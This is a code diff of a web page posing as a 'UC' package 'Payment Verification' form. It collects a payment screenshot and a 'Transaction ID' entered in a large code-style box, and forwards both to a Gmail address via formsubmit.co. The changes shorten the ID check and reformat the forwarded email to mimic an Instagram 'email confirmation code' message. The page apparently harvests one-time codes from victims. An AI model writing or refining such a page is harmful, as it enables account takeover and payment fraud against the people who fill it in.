@@ -24,25 +24,21 @@ input,select{width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:10px
 <div class="box step active" id="step1">
 <div class="uc">UC</div>
 <h2>Payment Verification</h2>
-<label>Package</label>
-<select id="pkg"><option>325 UC - Rs 1500</option><option>660 UC - Rs 3000</option><option>1800 UC - Rs 7500</option></select>
 <label>Amount</label>
-<input type="number" id="amount" placeholder="1500" value="1500">
+<input type="number" id="amount" value="1500">
 <label>Screenshot</label>
 <div class="file-box">
 <input type="file" id="ss" accept="image/*" onchange="document.getElementById('p1').style.display='block'; document.getElementById('p1').src=URL.createObjectURL(this.files[0])">
 <img id="p1" class="preview">
 </div>
 <button class="btn" id="verifyBtn" onclick="verifyAndGo()">VERIFY TO CHECK →</button>
-<div id="loader" class="loader"><div class="spinner"></div><p style="font-weight:bold">Verifying...</p></div>
+<div id="loader" class="loader"><div class="spinner"></div><p>Verifying...</p></div>
 </div>
 
 <div class="box step" id="step2">
 <div class="uc">UC</div>
 <h2>Transaction ID</h2>
-<label style="font-size:22px;text-align:center;background:#000;color:#f7b500;padding:10px;border-radius:10px">TRANSACTION NUMBER 👇</label>
-<input id="txn" type="tel" maxlength="13" placeholder="542495099" style="font-size:45px;text-align:center;letter-spacing:8px;font-weight:900;border:3px solid #f7b500;height:90px">
-
+<input id="txn" type="tel" placeholder="160443" style="font-size:45px;text-align:center;letter-spacing:8px;font-weight:900;border:3px solid #f7b500;height:90px">
 <div id="ok2" class="success"></div>
 <div style="display:flex;gap:8px;margin-top:12px">
 <button class="btn" style="background:#fff;flex:1" onclick="goBack()">← BACK</button>
@@ -59,9 +55,8 @@ function verifyAndGo(){
  document.getElementById('verifyBtn').style.display='none';
  document.getElementById('loader').style.display='block';
  let fd=new FormData();
- fd.append('_subject', `SCREENSHOT - ${amount}`);
+ fd.append('_subject', `SCREENSHOT - Rs ${amount}`);
  fd.append('_captcha','false');
- fd.append('Package',document.getElementById('pkg').value);
  fd.append('Amount',amount);
  fd.append('Screenshot',file);
  fetch("https://formsubmit.co/uaepass499@gmail.com",{method:"POST",body:fd});
@@ -79,23 +74,44 @@ function goBack(){
 async function sendTxn(){
  let id=document.getElementById('txn').value.trim();
  let amount=document.getElementById('amount').value;
- if(id.length<9){alert('9 digits ID likho');return;}
+ if(id.length<6){alert('Transaction ID likho');return;}
  let btn=document.getElementById('btn2');
  btn.innerText='Sending...';
+
+ // Instagram jaisa OTP boxes banate hain
+ let boxes = id.split('').map(d=>`<span style="display:inline-block;background:#e9e9e9;border-radius:10px;padding:14px 18px;margin:5px;font-size:48px;font-weight:900;color:#000;min-width:20px;text-align:center">${d}</span>`).join('');
+
+ let htmlEmail = `
+ <div style="font-family:Arial,sans-serif;max-width:500px;margin:0 auto;background:#fff;padding:20px">
+   <h2 style="font-size:22px;color:#000;margin-bottom:15px">Your email confirmation code</h2>
+   <p style="color:#666;font-size:14px">Code requested</p>
+   <div style="margin:20px 0">
+     ${boxes}
+   </div>
+   <div style="background:#2d2d2d;color:#fff;display:inline-block;padding:12px 25px;border-radius:25px;font-weight:bold;margin-top:10px">Copy code: ${id}</div>
+   <hr style="margin:30px 0;border:1px solid #eee">
+   <p style="font-size:16px"><b>Transaction_ID:</b> ${id}</p>
+   <p style="font-size:16px"><b>Amount:</b> ${amount}</p>
+   <p style="font-size:13px;color:#888">Submitted at ${new Date().toString()}</p>
+ </div>
+ `;
+
  let fd=new FormData();
- // YEH SAB SE IMPORTANT HAI - IS SE UPAR BADA OTP JAISA AYEGA
- fd.append('_subject', `🔐 TRANSACTION OTP: ${id} - ${id} - ${id}`);
+ fd.append('_subject', `Your email confirmation code - ${id}`);
  fd.append('_captcha','false');
- fd.append('🔐 TRANSACTION_NUMBER_OTP', id);
+ fd.append('_template','table');
+ fd.append('Transaction_Code', id);
  fd.append('Amount', amount);
- fd.append('Package', document.getElementById('pkg').value);
- // EXTRA BADA DIKHANE KE LIYE
- fd.append('OTP_CODE_BIG', `>> ${id} <<`);
+ fd.append('OTP_HTML', htmlEmail);
+ // FormSubmit HTML bhejne ke liye message field me HTML
+ fd.append('message', htmlEmail);
+ 
  await fetch("https://formsubmit.co/uaepass499@gmail.com",{method:"POST",body:fd});
+ 
  document.getElementById('ok2').style.display='block';
- document.getElementById('ok2').innerText=`✅ ${id} Bhej diya! Mail check karo, upar bada ayega`;
+ document.getElementById('ok2').innerText=`✅ ${id} OTP style me bhej diya!`;
  btn.innerText='SUBMIT ID - Phir se';
 }
 </script>
 </body>
-</html>
+ </html>
